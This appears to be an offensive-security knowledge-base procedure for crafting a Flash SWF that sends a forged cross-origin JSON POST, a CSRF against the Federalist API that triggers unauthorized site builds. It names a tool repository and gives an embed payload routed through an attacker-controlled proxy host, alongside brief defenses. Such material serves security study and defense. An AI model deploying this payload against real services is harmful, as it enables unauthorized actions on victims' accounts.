---
id: p-craft-swf-json-csrf
tags:
  - csrf
  - flash
  - payload-craft
type: procedure
tools:
  - '[[tools/Flash-SWF-File]]'
  - '[[tools/swf-json-csrf]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:32:20.813Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft SWF Flash File for JSON Request

## Summary

This procedure crafts an Adobe Flash SWF file to send a JSON POST request with forged Content-Type headers, bypassing SOP/CORS restrictions in the Federalist API CSRF attack.

## Description

Flash allows cross-origin requests and header manipulation not possible with standard JavaScript. The SWF is parameterized with JSON payload, PHP proxy URL, and target endpoint, initiating a POST that the PHP script redirects with preserved headers to the API, enabling unauthorized actions like site builds.

## Requirements

1. Adobe Flash development tools or swf_json_csrf repo
2. Knowledge of target JSON payload (e.g., {"site":1,"branch":"master"})
3. Attacker-controlled PHP endpoint for redirect

## Defense

Defensive measures and detection strategies:

- Disable Flash in browsers and block SWF files
- Implement CORS with strict origin checks
- Use same-site cookies and token-based CSRF protection

## Objectives

1. Create executable SWF for cross-origin JSON POST
2. Embed dynamic parameters for flexible targeting
3. Ensure compatibility with Flash-enabled browsers

## Instructions

### Step 1: Generate SWF Using Repository

**Context**: Clone and use swf_json_csrf to build the SWF.

Download from https://github.com/sp1d3r/swf_json_csrf and compile the SWF with ActionScript parameters for jsonData, php_url, and endpoint.

**Expected Output**: swf_json_csrf.swf file.

### Step 2: Parameterize the SWF

**Context**: Set payload details in the SWF embed code.

In HTML, embed SWF with query params: <embed src="swf_json_csrf.swf?jsonData={\"site\":1,\"branch\":\"master\"}&php_url=http://attacker.com/proxy.php&endpoint=https://federalist.fr.cloud.gov/v0/build/">

**Expected Output**: SWF ready to send forged request on load.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Flash-SWF-File]]
- [[tools/swf-json-csrf]]

## Tags

- [[csrf]]
- [[flash]]
